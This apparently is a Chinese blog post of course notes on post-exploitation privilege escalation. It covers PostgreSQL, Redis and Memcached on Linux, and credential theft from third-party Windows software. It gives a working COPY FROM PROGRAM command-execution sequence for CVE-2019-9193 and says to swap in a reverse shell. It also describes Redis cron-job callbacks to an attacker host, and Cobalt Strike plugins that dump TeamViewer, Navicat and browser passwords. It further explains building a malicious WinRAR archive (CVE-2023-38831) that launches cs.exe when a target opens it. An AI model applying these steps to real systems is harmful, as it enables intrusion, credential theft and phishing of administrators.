---
title: "系统提权：PostgreSQL、Redis、第三方应用、密码凭据"
pubDate: 2026-08-19
tags:
  - 安全
  - 提权
---

提权补充篇，两条线：一条是 Linux 上的数据库提权（PostgreSQL/Redis/Memcached），一条是拿到计算机用户后从第三方软件里抠凭据、上钓鱼文件

## 三个数据库先认识

| 数据库 | 端口 | 账号 | 默认外连 |
|---|---|---|---|
| PostgreSQL | 5432 | postgres | 否 |
| Redis | 6379 | 无默认账密 | 是 |
| Memcached | 11211 | 无认证机制 | 是 |

基本都搭在 Linux 上，属于 Linux 数据库提权的内容

## PostgreSQL 提权

条件：知道账密。可打的是 CVE-2019-9193（COPY FROM PROGRAM 特性滥用），9.3~11 版本普通用户即可，12+ 要超级用户。UDF 和 libc 老路线基本废了

Navicat 连上后命令列界面执行（以执行 id 为例）：

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

能出结果就是命令执行成功，接着换反弹 shell 命令。工具的话 MDUT 和上节课一样，添加连接后选 CVE 那个利用方式

## Redis 提权

条件：未授权或知道密码。四种打法：写 SSH 密钥、计划任务（基本用这个）、反弹 shell、CVE-2022 沙盒执行

- **MDUT**：空密码直连，三种利用方式里推荐计划任务，远程 IP/端口填攻击机的，写完等回连
- **RequestTemplate**：提供新的命令执行方式但有利用条件，和 MDUT 结合用

## Memcached

纯 key-value 缓存，没有提权说法，但它无认证——开发者要是把后台账密之类的敏感信息塞里面就能直接连上去翻。fofa 语法 `port="11211"`，RequestTemplate 支持连接

## 第三方软件提权（计算机用户权限）

实战/HW 里钓鱼、社工拿到内网主机后，看装了什么软件再下手：

```shell
远控类：Teamviewer 向日葵 Todesk VNC Radmin
密码类：浏览器 Xshell Navicat 3389
服务类：FileZilla Serv-u Zend
文档类：Winrar WPS Office
```

两条路子：一是收集/提取有价值凭据提升，二是放钓鱼文件等管理员触发。演示用 CS 上线，因为它的插件能直接对第三方软件操作：

- **TeamViewer**：插件直接读登录凭证，拿 ID+密码客户端直连
- **Navicat**：插件抠出保存的数据库连接账密（Web 权限拿不到，要计算机用户权限）
- **浏览器密码**：要对方高权限用户（低权限建目录跑不了工具），提取 Edge 等保存的密码再去登对应网站
- **WinRAR CVE-2023-38831**：用 python 脚本把 bat 和正常 pdf 打包成恶意 rar，目标双击就执行 bat 里的 cs.exe 上线。2023 年的洞但破解版没人升级，碰到概率还在

## 要点

数据库这条线记口诀：PostgreSQL 有账密就打 CVE-2019-9193，Redis 未授权优先写计划任务，Memcached 无认证只能翻敏感信息赌。第三方软件这是拿主机后的第一件事——tasklist 看装了啥：远控抠 TeamViewer 凭证、密码类抠 Navicat/浏览器、文档类上 WinRAR 钓鱼包等管理员点  前提都是先有计算机用户权限
